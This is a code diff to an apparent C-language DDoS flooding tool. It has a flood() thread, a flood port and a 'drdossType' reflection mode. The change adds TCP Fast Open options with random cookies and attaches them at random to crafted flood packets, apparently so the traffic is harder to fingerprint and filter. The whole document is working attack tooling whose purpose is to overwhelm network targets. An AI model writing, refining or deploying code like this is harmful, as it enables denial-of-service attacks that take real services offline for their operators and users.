@@ -20,6 +20,7 @@
 
 #define MAX_PACKET_SIZE 4096
 #define PHI 0x9e3779b9
+#define TFO_LEN 6
 
 static unsigned long int Q[4096], c = 362436;
 static unsigned int floodport;
@@ -41,27 +42,22 @@ struct tcpOptions
 	uint8_t msskind;
 	uint8_t msslen;
 	uint16_t mssvalue;
+
 	uint8_t nop_nouse;
+
 	uint8_t wskind;
 	uint8_t wslen;
 	uint8_t wsshiftcount;
+
 	uint8_t nop_nouse2;
 	uint8_t nop_nouse3;
+
 	uint8_t sackkind;
 	uint8_t sacklen;
-	/*
-	uint8_t tstamp;
-	uint8_t tslen;
-	uint8_t tsno;
-	uint8_t tsclockval;
-	uint8_t tssendval;
-	uint8_t tsval;
-	uint8_t tsclock;
-	uint8_t tsecho;
-	uint8_t tsecho2;
-	uint8_t tsecho3;
-	uint8_t tsecho4;
-	*/
+
+	uint8_t tfokind;
+	uint8_t tfolen;
+	uint8_t tfocookie[6];
 };
 
 struct list *head;
@@ -237,19 +233,28 @@ void setup_tcpopts_header(struct tcpOptions *opts)
 	opts->wsshiftcount = 0x07;
 	opts->sackkind = 0x04;
 	opts->sacklen = 0x02;
-	/*
-	opts->tstamp = 0x08;
-	opts->tslen = 0x0a;
-	opts->tsno = randnum(1, 250);
-	opts->tsclockval = 0x68;
-	opts->tssendval = 0xa3;
-	opts->tsval = 0xd8;
-	opts->tsclock = 0xd9;
-	opts->tsecho = 0x00;
-	opts ->tsecho2 = 0x00;
-	opts->tsecho3 = 0x00;
-	opts->tsecho4 = 0x00;
-	*/
+	opts->tfokind = 0x22;
+	opts->tfolen = 2 + TFO_LEN;
+	for (int i = 0; i < TFO_LEN; i++)
+	{
+		opts->tfocookie[i] = rand_cmwc() & 0xFF;
+	}
+}
+
+char *generateTfoCookie(int cookieSize)
+{
+	char *cookieData = malloc(cookieSize);
+	if (cookieData == NULL)
+	{
+		fprintf(stderr, "Memory allocation failed for cookie data.\n");
+		exit(EXIT_FAILURE);
+	}
+
+	for (int i = 0; i < cookieSize; i++)
+	{
+		cookieData[i] = rand_cmwc() & 0xFF;
+	}
+	return cookieData;
 }
 
 void *flood(void *par1)
@@ -338,6 +343,12 @@ void *flood(void *par1)
 		else
 		{
 			int drdossType = sPorts[randnum(0, 4)];
+
+			if (randnum(0, 1) == 1)
+			{
+				setup_tcpopts_header(opts);
+				memcpy(opts->tfocookie, generateTfoCookie(TFO_LEN), TFO_LEN);
+			}
 
 			if (floodport == 0)
 			{
